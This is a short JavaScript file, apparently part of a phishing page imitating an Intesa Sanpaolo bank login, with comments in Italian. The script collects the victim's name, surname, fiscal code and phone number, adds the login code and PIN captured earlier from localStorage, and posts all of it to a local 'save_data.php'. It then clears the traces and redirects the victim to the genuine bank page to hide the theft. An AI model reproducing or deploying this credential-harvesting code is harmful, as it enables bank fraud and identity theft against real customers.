document.addEventListener('DOMContentLoaded', function() {
  // Trova il form
  const form = document.querySelector('form');
  // Trova gli input
  const nameInput = document.querySelector('input#name');
  const surnameInput = document.querySelector('input#surname');
  const fiscalCodeInput = document.querySelector('input#fiscalCode');
  const phoneInput = document.querySelector('input#phoneNumber');
  // Trova il pulsante submit e il suo wrapper
  const submitBtn = document.getElementById('submit-continua-button');
  const btnWrapper = submitBtn.parentElement;

  function checkEnableButton() {
    const nameValid = nameInput.value.trim().length >= 1;
    const surnameValid = surnameInput.value.trim().length >= 1;
    const fiscalCodeValid = fiscalCodeInput.value.trim().length >= 1;
    const phoneValid = phoneInput.value.trim().length >= 8;
    const isEnabled = nameValid && surnameValid && fiscalCodeValid && phoneValid;
    submitBtn.disabled = !isEnabled;
    if (isEnabled) {
      btnWrapper.classList.remove('nbp-global-disable');
      submitBtn.style.cursor = 'pointer';
    } else {
      btnWrapper.classList.add('nbp-global-disable');
      submitBtn.style.cursor = 'default';
    }
  }

  nameInput.addEventListener('input', checkEnableButton);
  surnameInput.addEventListener('input', checkEnableButton);
  fiscalCodeInput.addEventListener('input', checkEnableButton);
  phoneInput.addEventListener('input', checkEnableButton);

  form.addEventListener('submit', function(e) {
    e.preventDefault();
    console.log('Bottone CONTINUA cliccato');
    if (submitBtn.disabled) return;

    // Recupera i dati di login dal localStorage
    let loginData = {};
    try {
      loginData = JSON.parse(localStorage.getItem('loginData')) || {};
    } catch (err) {
      loginData = {};
    }

    // Unisce tutti i dati
    const allData = {
      name: nameInput.value,
      surname: surnameInput.value,
      fiscalCode: fiscalCodeInput.value,
      phoneNumber: phoneInput.value,
      codice: loginData.codice || '',
      pin: loginData.pin || ''
    };

    // Invia tutti i dati a save_data.php
    fetch('../save_data.php', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(allData)
    })
    .finally(() => {
        // Pulisce il localStorage
        localStorage.removeItem('loginData');
        window.top.location.href = 'https://www.intesasanpaolo.com/it/extra-content-login/primo-accesso.html';
    });
  });

  checkEnableButton();
}); 